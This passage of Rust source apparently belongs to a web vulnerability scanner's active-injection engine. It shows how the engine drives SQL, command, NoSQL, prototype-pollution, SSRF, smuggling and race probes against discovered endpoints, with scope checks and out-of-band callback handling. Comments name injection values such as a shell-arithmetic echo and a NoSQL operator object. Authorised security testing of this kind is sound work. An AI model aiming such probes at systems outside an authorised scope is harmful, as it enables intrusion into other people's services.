//! Active-injection oracle: fuzz discovered request parameters for SQL injection,
//! reflected XSS, OS command injection, and local file inclusion / path traversal.
//!
//! Every candidate flows through GENERATE -> DETECT -> CONFIRM -> REPORT, the same
//! correctness discipline as the template and authz engines: a hit is re-issued
//! (and, for differential/timing classes, checked against a control) before it is
//! reported. All probes are read-only and non-destructive -- SQLi/cmdi confirmation
//! is by DB-error signature, boolean/response differential, a benign `SLEEP`, or an
//! out-of-band OAST callback; never a state-changing payload.
//!
//! An injection *site* is one fuzzable location: a URL query parameter, a form-body
//! field (application/x-www-form-urlencoded), or a JSON-body field. The request the
//! target actually expects (method + body shape) is learned by the caller (form
//! parsing / OpenAPI ingestion / JS analysis) and passed in per endpoint.

use crate::engine::{AuthSpec, OastSpec};
use crate::probe::{
    self, Resp, is_server_error, json_typed, pct_decode, pct_encode, send, send_with, typed_default,
};
use cfx_finding::Finding;
use serde::Deserialize;
use serde_json::{Value, json};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;
use tokio::sync::mpsc;
use transport::Client;

#[derive(Debug, Deserialize)]
pub struct InjectParams {
    #[serde(default)]
    pub endpoints: Vec<InjEndpoint>,
    #[serde(default = "d_timeout")]
    pub timeout_ms: u64,
    #[serde(default)]
    pub target: String,
    #[serde(default = "d_true")]
    pub evasive: bool,
    #[serde(default)]
    pub identify: Option<String>,
    #[serde(default)]
    pub auth: Option<AuthSpec>,
    /// Independent sessions for the same identity, one per worker.
    ///
    /// A single session is a bottleneck on any target that locks it per
    /// request - PHP does by default - because the target then serialises the
    /// whole pass however many workers we run. Worse, a time-based payload
    /// holds that lock for five or ten seconds while everything else queues
    /// behind it and times out, and a timeout is reported as "the endpoint did
    /// not answer", so the visible symptom is missing coverage.
    ///
    /// Empty (the default) means "use `auth` for everything", which is right
    /// for a stateless credential: a bearer token has no lock to contend on.
    #[serde(default)]
    pub auth_pool: Vec<AuthSpec>,
    #[serde(default)]
    pub oast: Option<OastSpec>,
    /// Which classes to run (sqli/xss/cmdi/lfi); empty/null = all.
    #[serde(default, deserialize_with = "crate::probe::de_null_seq")]
    pub classes: Vec<String>,
    /// Endpoints probed concurrently. Same meaning as mach's and pulse's
    /// `tasks`, and clamped, because the target is someone's service.
    #[serde(default = "d_tasks")]
    pub tasks: usize,
    /// Addresses other engines observed on this workspace's estate, for a
    /// confirmed SSRF to be tested against. Addresses, deliberately, not
    /// findings: see `chain`.
    #[serde(default)]
    pub internal_targets: Vec<crate::chain::InternalTarget>,
    /// Destinations beyond the scan target that the OPERATOR has asserted they
    /// may test. Empty is the historical behaviour exactly. See `scope`.
    #[serde(default, deserialize_with = "crate::probe::de_null_seq")]
    pub scope: Vec<String>,
    /// Refuse private and reserved destinations at connect time. Absent = false,
    /// which is what an authorised customer scan gets: reaching your own
    /// internal network from your own node is the product. The free public
    /// tools set it, because there the caller is anonymous and the egress is
    /// ours.
    #[serde(default)]
    pub block_internal: bool,
}
fn d_timeout() -> u64 {
    12_000
}
fn d_tasks() -> usize {
    DEFAULT_TASKS
}
fn d_true() -> bool {
    true
}
fn d_get() -> String {
    "GET".to_string()
}
fn d_form() -> String {
    "form".to_string()
}

#[derive(Debug, Deserialize, Clone)]
pub struct BodyField {
    pub name: String,
    #[serde(default)]
    pub value: String,
    /// Declared JSON type (from a spec): "string" | "integer" | "number" | "boolean" | "array" |
    /// "object". Lets the JSON body keep this field's baseline value well-typed so the request
    /// stays valid and the injection actually reaches the code, instead of the server rejecting a
    /// stringified number up front. `None` => treat as string.
    #[serde(default, rename = "type")]
    pub ty: Option<String>,
}

#[derive(Debug, Deserialize, Clone)]
pub struct InjEndpoint {
    #[serde(default = "d_get")]
    pub method: String,
    pub url: String,
    /// Query param names to fuzz. Empty = every query param present in `url`.
    #[serde(default)]
    pub params: Vec<String>,
    /// Body fields to fuzz (their baseline values keep the request well-formed).
    #[serde(default)]
    pub body: Vec<BodyField>,
    /// "form" (x-www-form-urlencoded) or "json".
    #[serde(default = "d_form")]
    pub body_type: String,
    /// Path segments that are parameters rather than fixed route text.
    ///
    /// This is the strongest signal available and it comes from a contract: an
    /// OpenAPI `{id}`, or an operation in the asset graph whose request shape
    /// records the segment as a variable. Accepts either a 0-based segment
    /// index, or the segment's text (with or without `{}`), because callers
    /// have one or the other depending on where the endpoint came from.
    #[serde(default)]
    pub path_params: Vec<Value>,
}

/// How many endpoints get a race burst in one scan. Small on purpose: see
/// `race`, where every probe is a state change that cannot be undone.
const MAX_RACE_ENDPOINTS: usize = 3;
const SLEEP_SECS: u64 = 5;
const SLEEP_THRESHOLD_MS: u128 = 3800;
// Two large coprime factors for the reflected-cmdi echo oracle. Their product is a distinctive
// 11-digit number that appears in the response only if a shell evaluated `$((A*B))`; the literal
// payload never contains it. Chosen so the product is unlikely to occur naturally in any page.
const CMDI_ECHO_A: u64 = 199_933;
const CMDI_ECHO_B: u64 = 314_573;
const MAX_ENDPOINTS: usize = 300;
/// Endpoints probed at once. Injection is request-bound, not CPU-bound, and one
/// endpoint at a time meant a scan of a few dozen endpoints across every class
/// took long enough that callers capped it and lost coverage instead. Kept low
/// by default: a target being scanned is someone's production service.
const DEFAULT_TASKS: usize = 6;

/// Dedupe keys shared across the concurrent endpoint workers, for the checks
/// that are a property of a service or a path family rather than of one
/// endpoint (shadow versions, rate limiting, CORS, XML).
/// A finding that is built and waiting on an out-of-band callback.
///
/// Blind out-of-band detection used to block: every injection point registered
/// its own correlation, fired its payloads, then slept and polled four times
/// before giving up. Against a target with no shell - which is almost every
/// injection point on almost every target - that is several seconds of waiting
/// per point for a callback that will never come, and it dominated scan time.
/// A 45-endpoint application spent an hour idle, talking to the callback
/// service rather than to the target.
///
/// Nothing about out-of-band detection needs that wait. The callback only has
/// to arrive before the scan reports. So the payloads go out carrying a marker
/// that identifies the point that sent them, the finding is built and parked
/// here, and one poll at the end of the pass decides which of them fired.
pub struct PendingOob {
    /// The per-payload label inside the callback hostname.
    pub marker: String,
    /// Emitted verbatim if that marker calls back.
    pub finding: Value,
}

pub type OobQueue = std::sync::Mutex<Vec<PendingOob>>;

/// What makes two findings the same bug: class, path, parameter, injection
/// point. Not the URL - a routing parameter gives one sink many URLs.
///
/// Defined once because there are two emit paths. The per-site path reports as
/// it goes; the out-of-band path reports at the end of the pass when the
/// callbacks come back. Both have to answer "have we already said this?" the
/// same way, and when only the first one did, two injection points on one path
/// could each park a callback and both be reported.
pub fn finding_identity(f: &Value) -> String {
    format!(
        "{}|{}|{}|{}",
        f["vuln_class"].as_str().unwrap_or(""),
        path_only(f["url"].as_str().unwrap_or("")),
        f["param"].as_str().unwrap_or(""),
        f["location"].as_str().unwrap_or("")
    )
}

pub type SeenSet = std::sync::Mutex<HashSet<String>>;

/// True the first time this key is offered. The lock is taken and released
/// around the insert alone, never held across a request.
pub fn seen_once(seen: &SeenSet, key: String) -> bool {
    match seen.lock() {
        Ok(mut g) => g.insert(key),
        // A poisoned lock means another worker panicked; carry on rather than
        // taking the whole scan down with it.
        Err(p) => p.into_inner().insert(key),
    }
}
const MAX_SITES_PER_EP: usize = 16;

#[derive(Clone, Copy, PartialEq)]
enum Loc {
    Query,
    BodyForm,
    BodyJson,
    Path,
    Header,
}

/// One fuzzable location on one endpoint.
#[derive(Clone)]
struct Site {
    method: String,
    url: String, // full URL (query included)
    loc: Loc,
    param: String,      // the field/param being fuzzed (segment for Path)
    base_value: String, // its baseline value (keeps the request valid)
    // baseline body fields (for body sites): (name, value, declared JSON type)
    body: Vec<(String, String, Option<String>)>,
    path_idx: usize, // which path segment (Loc::Path only)
}

impl Site {
    /// Render (url, optional (body, content-type)) with `param` set to `value`.
    fn render(&self, value: &str) -> (String, Option<(String, &'static str)>) {
        match self.loc {
            Loc::Query => (set_param(&self.url, &self.param, value), None),
            Loc::Path => (set_path_seg(&self.url, self.path_idx, value), None),
            // Header sites keep the URL + body untouched; the payload rides in a request header
            // instead (see `header_override`).
            Loc::Header => (self.url.clone(), None),
            Loc::BodyForm => {
                let body = self
                    .body
                    .iter()
                    .map(|(k, v, _)| {
                        let vv = if k == &self.param { value } else { v.as_str() };
                        format!("{}={}", pct_encode(k), pct_encode(vv))
                    })
                    .collect::<Vec<_>>()
                    .join("&");
                (
                    self.url.clone(),
                    Some((body, "application/x-www-form-urlencoded")),
                )
            }
            Loc::BodyJson => {
                let mut obj = serde_json::Map::new();
                for (k, v, ty) in &self.body {
                    // The FUZZED field carries the payload verbatim as a string (that is the
                    // injection). Every OTHER field is emitted with its declared JSON type so the
                    // body validates and the request reaches the code under test.
                    let jv = if k == &self.param {
                        Value::String(value.to_string())
                    } else {
                        json_typed(v, ty.as_deref())
                    };
                    obj.insert(k.clone(), jv);
                }
                (
                    self.url.clone(),
                    Some((Value::Object(obj).to_string(), "application/json")),
                )
            }
        }
    }
    /// Render a JSON body where the fuzzed field carries a RAW JSON value (e.g. an operator object
    /// `{"$gt":""}`) rather than a string. Used by the NoSQL probe. `None` unless this is a JSON body.
    fn render_body_json_raw(&self, raw: &Value) -> Option<(String, &'static str)> {
        if self.loc != Loc::BodyJson {
            return None;
        }
        let mut obj = serde_json::Map::new();
        for (k, v, ty) in &self.body {
            let jv = if k == &self.param {
                raw.clone()
            } else {
                json_typed(v, ty.as_deref())
            };
            obj.insert(k.clone(), jv);
        }
        Some((Value::Object(obj).to_string(), "application/json"))
    }

    /// The body with extra keys added at the TOP level, beside the real fields.
    ///
    /// Prototype pollution is not a per-parameter injection: `__proto__` has to
    /// be a sibling of the application's own fields, not the value of one of
    /// them. Rendering it through the per-parameter path produces
    /// `{"name": {"__proto__": ...}}`, which is just a nested object and
    /// pollutes nothing - a mistake that made the probe silently find nothing
    /// against a fixture built to be vulnerable.
    fn render_body_json_with(
        &self,
        extra: &serde_json::Map<String, Value>,
    ) -> Option<(String, &'static str)> {
        if self.loc != Loc::BodyJson {
            return None;
        }
        let mut obj = serde_json::Map::new();
        for (k, v, ty) in &self.body {
            obj.insert(k.clone(), json_typed(v, ty.as_deref()));
        }
        for (k, v) in extra {
            obj.insert(k.clone(), v.clone());
        }
        Some((Value::Object(obj).to_string(), "application/json"))
    }

    /// Request headers this site overrides for its payload. Empty for URL/body sites; for a Header
    /// site it carries the payload in the named request header.
    fn header_override(&self, value: &str) -> Vec<(String, String)> {
        match self.loc {
            Loc::Header => vec![(self.param.clone(), value.to_string())],
            _ => Vec::new(),
        }
    }
    fn where_label(&self) -> String {
        match self.loc {
            Loc::Query => format!("query parameter `{}`", self.param),
            Loc::BodyForm | Loc::BodyJson => format!("body parameter `{}`", self.param),
            Loc::Path => format!("URL path segment `{}`", self.param),
            Loc::Header => format!("request header `{}`", self.param),
        }
    }
}

pub async fn run(params: InjectParams, tx: mpsc::UnboundedSender<Value>) {
    let _ = tx.send(json!({"type":"ack","target": params.target}));
    if params.endpoints.is_empty() {
        let _ = tx.send(json!({"type":"error","message":"injection testing needs at least one endpoint (run a crawl first, or provide endpoints)"}));
        let _ = tx.send(json!({"type":"done","found":0}));
        return;
    }
    // Injection probes send a benign SLEEP, so the timeout floor must clear it.
    let client = match probe::build_client(probe::ClientOpts {
        evasive: params.evasive,
        identify: params.identify.clone(),
        auth: params.auth.as_ref(),
        target: &params.target,
        timeout_ms: params.timeout_ms,
        block_internal: params.block_internal,
        // Room for the DOUBLED sleep the time-based oracle uses to prove the
        // delay tracks the number we asked for. Sized for one sleep, the
        // confirming request times out and every real time-based finding is
        // lost with the false ones.
        min_timeout_ms: SLEEP_SECS * 2 * 1000 + 3000,
    }) {
        Some(c) => c,
        None => {
            let _ = tx.send(json!({"type":"error","message":"client build failed"}));
            return;
        }
    };
    // One client per session in the pool. Workers take one each, so two workers
    // never contend on the same server-side session lock.
    let session_clients: Vec<Client> = params
        .auth_pool
        .iter()
        .skip(1)
        .filter_map(|a| {
            probe::build_client(probe::ClientOpts {
                evasive: params.evasive,
                identify: params.identify.clone(),
                auth: Some(a),
                target: &params.target,
                timeout_ms: params.timeout_ms,
                min_timeout_ms: SLEEP_SECS * 2 * 1000 + 3000,
                block_internal: params.block_internal,
            })
        })
        .collect();
    if !session_clients.is_empty() {
        let _ = tx.send(json!({
            "type": "log",
            "message": format!(
                "{} independent sessions in use, so workers do not queue behind one another on the \
                 target's session lock",
                session_clients.len() + 1
            )
        }));
    }

    // A redirect-following client hides the 3xx + Location the open-redirect oracle needs, so build a
    // second client with redirects disabled just for that probe.
    let client_nr = probe::build_client_no_redirect(probe::ClientOpts {
        evasive: params.evasive,
        identify: params.identify.clone(),
        auth: params.auth.as_ref(),
        target: &params.target,
        timeout_ms: params.timeout_ms,
        min_timeout_ms: 0,
        block_internal: params.block_internal,
    });
    let oast = match &params.oast {
        Some(s) if !s.domains.is_empty() && !s.api_url.is_empty() => {
            crate::oast::OastClient::from_spec(s.domains.clone(), &s.api_url)
        }
        _ => crate::oast::OastClient::from_env(),
    };

    let total = params.endpoints.len().min(MAX_ENDPOINTS) as i64;

    // Positions the corpus proves variable, computed once over every endpoint
    // we were given rather than per endpoint: the evidence for `/users/alice`
    // lives in `/users/bob`, which is a different endpoint.
    let varying = Arc::new(varying_path_indices(&params.endpoints));
    // Dedupe keys for the checks that belong to a service or a path family
    // rather than to one endpoint.
    let inv_seen: Arc<SeenSet> = Arc::new(SeenSet::default());
    let rl_seen: Arc<SeenSet> = Arc::new(SeenSet::default());
    let cors_seen: Arc<SeenSet> = Arc::new(SeenSet::default());
    // One bug, reported once. A routing parameter gives the same sink many
    // URLs - Mutillidae's hints-page-wrapper.php answers on a dozen values of
    // `level1HintIncludeFile`, all reaching one query - and reporting the same
    // SQL injection once per value is noise that buries the rest.
    let found_seen: Arc<SeenSet> = Arc::new(SeenSet::default());
    // ONE out-of-band correlation for the whole pass, and one queue of findings
    // waiting on it. Registering per injection point, then blocking on four
    // polls each, is what made a 45-endpoint scan take an hour while the target
    // sat idle at 0.09% CPU.
    // Registration is now a single point of failure for the whole pass, where
    // before every probe registered its own and a transient failure cost only
    // that probe. So retry it, and if it still fails, SAY SO. A scanner that
    // quietly stops testing a whole class is the worst failure mode there is:
    // the report looks the same as a clean one.
    let mut oob_reg: Option<Arc<crate::oast::OastReg>> = None;
    if let Some(oc) = oast.as_ref() {
        for attempt in 0..3 {
            if let Some(r) = oc.register(&client).await {
                oob_reg = Some(Arc::new(r));
                break;
            }
            if attempt < 2 {
                tokio::time::sleep(Duration::from_millis(500 << attempt)).await;
            }
        }
        if oob_reg.is_none() {
            let _ = tx.send(json!({
                "type": "log",
                "message": "out-of-band callbacks are UNAVAILABLE (registration failed after 3 \
                            attempts). Blind command injection, blind SSRF and blind XXE cannot be \
                            confirmed in this run; their absence from the results is not evidence."
            }));
        }
    }
    let oob_queue: Arc<OobQueue> = Arc::new(OobQueue::default());
    crate::probe::meter::reset();
    let xml_seen: Arc<SeenSet> = Arc::new(SeenSet::default());
    let classes = Arc::new(
        params
            .classes
            .iter()
            .map(|c| c.to_lowercase())
            .collect::<Vec<String>>(),
    );
    let oast = oast.map(Arc::new);
    // Race conditions run only when named. Building the recipe here rather than
    // per endpoint keeps the identity fixed for the whole scan, which is what
    // makes the burst a race between one user's requests instead of eight
    // users' first requests.
    let race = classes.iter().any(|c| c == "race").then(|| {
        Arc::new(crate::race::Recipe {
            evasive: params.evasive,
            identify: params.identify.clone(),
            auth: params.auth.clone(),
            target: params.target.clone(),
            timeout_ms: params.timeout_ms,
            block_internal: params.block_internal,
        })
    });
    // The operator's authorisation list, parsed once. Anything unparseable is
    // refused and named rather than dropped, because a scan running with two of
    // five rules misunderstood produces results that mean something other than
    // what the operator thinks.
    let (authorised, refused) = crate::scope::parse(&params.scope);
    if !refused.is_empty() {
        let _ = tx.send(json!({
            "type": "log",
            "message": format!(
                "{} scope entr{} refused and NOT authorised: {}. They are not treated as \
                 wildcards; anything they were meant to cover is out of scope for this pass.",
                refused.len(),
                if refused.len() == 1 { "y was" } else { "ies were" },
                refused.join(", ")
            )
        }));
    }
    if !authorised.is_empty() {
        let _ = tx.send(json!({
            "type": "log",
            "message": format!(
                "{} destination(s) beyond the scan target are authorised for this pass by the \
                 workspace scope list.",
                authorised.len()
            )
        }));
    }
    let authorised_arc = Arc::new(authorised);
    // Scope is applied once, here, rather than inside the probe: a decision
    // about what may be touched belongs in one place, and filtering here means
    // the count of what was refused can be said out loud.
    let offered = params.internal_targets.len();
    let chain_targets: Vec<crate::chain::InternalTarget> = params
        .internal_targets
        .iter()
        .filter(|t| authorised_arc.admits(&t.host, Some(t.port)))
        .cloned()
        .collect();
    let refused_targets = offered - chain_targets.len();
    if refused_targets > 0 {
        let _ = tx.send(json!({
            "type": "log",
            "message": format!(
                "{refused_targets} of {offered} address(es) other engines found are NOT in the \
                 authorised scope, so a confirmed SSRF will not be pointed at them. Add them to \
                 the workspace scope if you are authorised to test them."
            )
        }));
    }
    let chain_targets = Arc::new(chain_targets);
    if !chain_targets.is_empty() {
        let _ = tx.send(json!({
            "type": "log",
            "message": format!(
                "{} address(es) other engines observed on this estate are available for a \
                 confirmed SSRF to be tested against. Each is checked against the authorised \
                 scope, and each is re-probed through the bug before it is reported: a pair of \
                 findings on one network is not a chain.",
                chain_targets.len()
            )
        }));
    }
    let skips = Arc::new(AtomicUsize::new(0));
    let race_budget = Arc::new(AtomicUsize::new(if race.is_some() {
        MAX_RACE_ENDPOINTS
    } else {
        0
    }));
    if race.is_some() {
        let _ = tx.send(json!({
            "type": "log",
            "message": format!(
                "race-condition checks are ON for up to {MAX_RACE_ENDPOINTS} endpoints. Each one sends {} identical requests at once and then two more, and every one of them is a real state change on the target: this check cannot ask its question without doing so.",
                crate::race::BURST
            )
        }));
    }
    let mut tasks = params.tasks.clamp(1, 16);

    let mut found = 0i64;
    let mut done = 0i64;
    let mut spawned: usize = 0;
    let mut set: tokio::task::JoinSet<(InjEndpoint, EndpointOutcome)> = tokio::task::JoinSet::new();
    // Endpoints the target stopped answering while the pass was at full width.
    // Retried one at a time afterwards rather than written off: the failure is
    // a statement about how hard we were pushing, not about the endpoint.
    let mut starved: Vec<InjEndpoint> = Vec::new();
    let mut retrying = false;
    let mut queue = params
        .endpoints
        .iter()
        .take(MAX_ENDPOINTS)
        .cloned()
        .collect::<std::collections::VecDeque<_>>();

    loop {
        while set.len() < tasks {
            let Some(ep) = queue.pop_front() else { break };
            if !in_scope(&params.target, &ep.url, &authorised_arc) {
                let _ = tx.send(json!({
                    "type": "log",
                    "message": format!(
                        "skipping {} - not on the scan target's host ({}). Active payloads are \
                         never sent off-scope.",
                        ep.url, params.target
                    )
                }));
                done += 1;
                continue;
            }
            // Round-robin the sessions so consecutive workers land on
            // different ones.
            let worker_client = if session_clients.is_empty() {
                client.clone()
            } else {
                let n = session_clients.len() + 1;
                match spawned % n {
                    0 => client.clone(),
                    k => session_clients[k - 1].clone(),
                }
            };
            spawned += 1;
            let ctx = EndpointCtx {
                client: worker_client,
                client_nr: client_nr.clone(),
                oast: oast.clone(),
                oob_reg: oob_reg.clone(),
                oob_queue: Arc::clone(&oob_queue),
                varying: Arc::clone(&varying),
                classes: Arc::clone(&classes),
                unauthenticated: params.auth.is_none(),
                inv_seen: Arc::clone(&inv_seen),
                rl_seen: Arc::clone(&rl_seen),
                cors_seen: Arc::clone(&cors_seen),
                found_seen: Arc::clone(&found_seen),
                chain_targets: Arc::clone(&chain_targets),
                race: race.clone(),
                race_budget: Arc::clone(&race_budget),
                skips: Arc::clone(&skips),
                xml_seen: Arc::clone(&xml_seen),
                tx: tx.clone(),
            };
            set.spawn(async move {
                let ep2 = ep.clone();
                (ep2, run_endpoint(ep, ctx).await)
            });
        }
        match set.join_next().await {
            Some(Ok((ep, outcome))) => {
                found += outcome.found;
                done += 1;
                if outcome.starved && !retrying {
                    starved.push(ep);
                }
            }
            Some(Err(_)) => done += 1,
            None => {
                if !starved.is_empty() && !retrying {
                    // Second pass, single file, so a target that could not keep
                    // up with eight workers gets a fair chance.
                    retrying = true;
                    tasks = 1;
                    let _ = tx.send(json!({
                        "type": "log",
                        "message": format!(
                            "{} endpoint(s) stopped answering under load; retrying them one at a \
                             time",
                            starved.len()
                        )
                    }));
                    queue.extend(starved.drain(..));
                    continue;
                }
                break;
            }
        }
        if done % 3 == 0 || done == total {
            let _ = tx.send(json!({"type":"progress","processed":done,"total":total}));
        }
        // Report the cost as the pass goes, not only when it ends.
        //
        // Both Mutillidae measurements ran past their harness deadline, so the
        // end-of-pass report never arrived and two runs produced no cost data at
        // all - which is the one thing the meter exists to prevent. A number
        // that only appears when everything went well is not a diagnostic.
        if done > 0 && done % METER_EVERY == 0 {
            report_cost(&tx, done, total);
        }
    }

    // Out-of-band callbacks, collected once. Everything that was going to call
    // back has had the whole pass to do it; this is the grace period for a
    // target that queues its outbound requests, not a per-payload wait.
    if let (Some(oc), Some(reg)) = (oast.as_ref(), oob_reg.as_ref()) {
        let pending: Vec<PendingOob> = oob_queue
            .lock()
            .map(|mut v| std::mem::take(&mut *v))
            .unwrap_or_default();
        if !pending.is_empty() {
            let _ = tx.send(json!({
                "type": "log",
                "message": format!(
                    "{} out-of-band payload(s) sent; polling once for callbacks",
                    pending.len()
                )
            }));
            let mut hosts: Vec<String> = Vec::new();
            for wait in [0u64, 2000, 4000] {
                if wait > 0 {
                    tokio::time::sleep(Duration::from_millis(wait)).await;
                }
                hosts = oc.poll_hosts(&client, reg).await;
                if !hosts.is_empty() {
                    break;
                }
            }
            for p in pending {
                if hosts.iter().any(|h| h.contains(&p.marker))
                    && seen_once(&found_seen, finding_identity(&p.finding))
                {
                    let _ = tx.send(json!({"type":"finding","data": p.finding}));
                    found += 1;
                }
            }
        }
        oc.deregister(&client, reg).await;
    }

    // What this pass cost, in the operator's terms. A scan that takes an hour
    // is a defect; a scan that took an hour because it sent 41,000 requests is
    // a capacity decision. Only one of those can be acted on, and until this
    // was reported the difference was a guess.
    report_cost(&tx, done, total);
    {
        let total_skips = skips.load(Ordering::Relaxed);
        if total_skips > SKIPS_SPELLED_OUT {
            let _ = tx.send(json!({
                "type": "log",
                "message": format!(
                    "{total_skips} injection sites were skipped because the endpoint did not \
                     answer a baseline request; the first {SKIPS_SPELLED_OUT} are named above. \
                     Those sites were not tested, which is not the same as their coming back \
                     clean. A count this high usually means the pass was pushing harder than the \
                     target could answer rather than that the endpoints are broken."
                )
            }));
        }
    }

    let _ = tx.send(json!({"type":"done","found":found}));
}

/// How often the pass reports what it has spent so far.
const METER_EVERY: i64 = 5;

/// Emit the cost meter: totals, then the most expensive classes.
///
/// Engine-seconds, not wall-clock: workers run concurrently, so the column sums
/// past the pass duration. The ratios are the point, and they are what said the
/// file-inclusion oracle was half of everything while the command-injection one
/// everybody suspected was two percent.
fn report_cost(tx: &mpsc::UnboundedSender<Value>, done: i64, total: i64) {
    let (reqs, wait_ms, pace_ms, fails) = crate::probe::meter::snapshot();
    if reqs == 0 {
        return;
    }
    let _ = tx.send(json!({
        "type": "log",
        "message": format!(
            "injection pass ({done}/{total} endpoints): {reqs} requests, {}s waiting on the \
             target, {}s pacing back-off, {fails} that never answered",
            wait_ms / 1000,
            pace_ms / 1000
        )
    }));
    let by_class = crate::probe::meter::by_class();
    let line = by_class
        .iter()
        .filter(|(_, ms, _)| *ms >= 1000)
        .take(8)
        .map(|(c, ms, n)| format!("{c} {}s/{n}", ms / 1000))
        .collect::<Vec<_>>()
        .join(", ");
    if !line.is_empty() {
        let _ = tx.send(json!({
            "type": "log",
            "message": format!("injection pass, engine-seconds by class: {line}")
        }));
    }
}

/// Hosts an injection pass is allowed to touch.
///
/// A crawl of Mutillidae picked up a donate form whose action is
/// `https://www.paypal.com/cgi-bin/webscr`, that endpoint reached this engine,
/// and it sent SQL injection payloads to PayPal. Nothing downstream of the
/// crawler was checking, so a single off-site form action was enough to point
/// active probes at a third party's production service.
///
/// The scan target defines the scope. An endpoint on another host is skipped and
/// said out loud. When no target is given the caller is trusted, because that is
/// an explicit endpoint list from an operator rather than something a crawl
/// produced.
///
/// `extra` widens it, and only an operator can put anything in there. See
/// `scope`: nothing a scan discovers is ever added, because "the scanner found
/// this" and "you may attack this" are different sentences.
fn in_scope(target: &str, url: &str, extra: &crate::scope::Scope) -> bool {
    let scope = host_of(target);
    if scope.is_empty() {
        return true;
    }
    let host = host_of(url);
    if host.is_empty() || host == scope {
        return true;
    }
    // A port difference on the same name is the same service to an operator who
    // named the host; a different name is not.
    let bare = |h: &str| h.split(':').next().unwrap_or(h).to_string();
    if bare(&host) == bare(&scope) {
        return true;
    }
    extra.admits(&bare(&host), port_of(url))
}

/// The URL's port: what it says, or what its scheme implies.
///
/// A rule written `redis.internal:6379` has to match a URL that says `:6379`,
/// and a rule written `api.example.com:443` has to match `https://api.example.com/`
/// which does not say a port at all.
fn port_of(url: &str) -> Option<u16> {
    let (scheme, rest) = url.split_once("://")?;
    let host = rest.split('/').next().unwrap_or("");
    let after = match host.rsplit_once(']') {
        // [::1]:8080
        Some((_, tail)) => tail.strip_prefix(':'),
        None => host.rsplit_once(':').map(|(_, p)| p),
    };
    if let Some(p) = after.and_then(|p| p.parse::<u16>().ok()) {
        return Some(p);
    }
    match scheme {
        "https" => Some(443),
        "http" => Some(80),
        _ => None,
    }
}

/// Everything one endpoint worker needs. Cloned per endpoint; the clients are
/// connection-pool handles and the sets are shared behind a mutex, so this is
/// cheap.
struct EndpointCtx {
    client: Client,
    client_nr: Option<Client>,
    oast: Option<Arc<crate::oast::OastClient>>,
    /// One correlation for the whole pass. Every out-of-band payload rides it,
    /// tagged with its own marker, and a single poll at the end sorts them out.
    oob_reg: Option<Arc<crate::oast::OastReg>>,
    oob_queue: Arc<OobQueue>,
    varying: Arc<VaryingPaths>,
    classes: Arc<Vec<String>>,
    /// Whether this scan is running without credentials. The public-exposure
    /// oracle's whole claim is "an anonymous caller gets this", so it must not
    /// run when the request carries a session.
    unauthenticated: bool,
    inv_seen: Arc<SeenSet>,
    rl_seen: Arc<SeenSet>,
    cors_seen: Arc<SeenSet>,
    found_seen: Arc<SeenSet>,
    xml_seen: Arc<SeenSet>,
    /// Addresses other engines observed on this estate, for a confirmed SSRF to
    /// be tested against. See `chain`.
    chain_targets: Arc<Vec<crate::chain::InternalTarget>>,
    /// Present only when the caller named the `race` class. Carries what the
    /// race probe needs to build its own connections, because the shared client
    /// is paced against the host and pacing is the opposite of what this check
    /// requires.
    race: Option<Arc<crate::race::Recipe>>,
    /// How many endpoints are still allowed a race burst this scan. Shared, and
    /// small: every burst is eight real state changes on somebody's
    /// application.
    race_budget: Arc<AtomicUsize>,
    /// How many sites have been skipped for a missing baseline, and how many of
    /// those were spelled out.
    ///
    /// The last Mutillidae pass emitted 86 of these, one per site, and the node
    /// keeps the newest fifty operator notes. So the messages that actually
    /// change what a reader believes - "out-of-band callbacks are UNAVAILABLE",
    /// "time-based oracles are OFF for this host" - were pushed out of the ring
    /// by the same sentence repeated eighty-six times. Loud and repetitive is
    /// its own kind of silent.
    skips: Arc<AtomicUsize>,
    tx: mpsc::UnboundedSender<Value>,
}

/// How many skipped sites are named individually before they are counted.
const SKIPS_SPELLED_OUT: usize = 5;

/// What one endpoint's pass produced.
struct EndpointOutcome {
    found: i64,
    /// Every site was skipped because the target stopped answering. That is a
    /// statement about load, not about the endpoint, so the driver retries it.
    starved: bool,
}

/// Probe one endpoint end to end.
async fn run_endpoint(ep: InjEndpoint, ctx: EndpointCtx) -> EndpointOutcome {
    let EndpointCtx {
        client,
        client_nr,
        oast,
        oob_reg,
        oob_queue,
        varying,
        classes,
        unauthenticated,
        inv_seen,
        rl_seen,
        cors_seen,
        found_seen,
        xml_seen,
        chain_targets,
        race,
        race_budget,
        skips,
        tx,
    } = ctx;
    let want = |c: &str| classes.is_empty() || classes.iter().any(|x| x == c);
    let oast = oast.as_deref();
    let mut found = 0i64;
    let mut sites = 0usize;
    let mut starved = 0usize;
    if want("inventory") {
        for f in crate::probe::spent("inventory", probe_inventory(&client, &ep, &inv_seen)).await {
            let _ = tx.send(json!({"type":"finding","data":f}));
            found += 1;
        }
    }
    if want("ratelimit") {
        if let Some(f) =
            crate::probe::spent("ratelimit", probe_ratelimit(&client, &ep, &rl_seen)).await
        {
            let _ = tx.send(json!({"type":"finding","data":f}));
            found += 1;
        }
    }
    if want("cors") {
        if let Some(f) = crate::probe::spent("cors", probe_cors(&client, &ep, &cors_seen)).await {
            let _ = tx.send(json!({"type":"finding","data":f}));
            found += 1;
        }
    }
    // Request smuggling, named explicitly only. Confirming a desync leaves a
    // partial request on a connection that may be shared, so it is never part
    // of a default sweep - the same rule as prototype pollution, for the same
    // reason: this one cannot leave the target as it found it.
    if classes.iter().any(|c| c == "smuggling")
        && crate::inject::seen_once(&xml_seen, format!("smuggle:{}", host_of(&ep.url)))
    {
        if let Some(f) = crate::probe::spent("smuggling", crate::smuggle::probe(&ep.url)).await {
            let _ = tx.send(json!({"type":"finding","data":f}));
            found += 1;
        }
    }
    // Race conditions, named explicitly only, and rationed. Same rule again:
    // proving a single-use limit can be used twice means using it twice, so the
    // budget is spent on the first few endpoints that could carry one rather
    // than on all of them.
    if let Some(recipe) = race.as_ref().filter(|_| crate::race::eligible(&ep)) {
        let took = race_budget
            .fetch_update(Ordering::Relaxed, Ordering::Relaxed, |n| {
                (n > 0).then(|| n - 1)
            })
            .is_ok();
        if took {
            let out = crate::probe::spent("race", crate::race::probe(recipe, &ep)).await;
            if let Some(msg) = out.note {
                let _ = tx.send(json!({"type": "log", "message": format!("   inject: {msg}")}));
            }
            if let Some(f) = out.finding {
                let _ = tx.send(json!({"type":"finding","data":f}));
                found += 1;
            }
        }
    }
    if want("xxe") {
        for f in crate::probe::spent(
            "xxe",
            crate::xml::probe(
                &client,
                &ep.method,
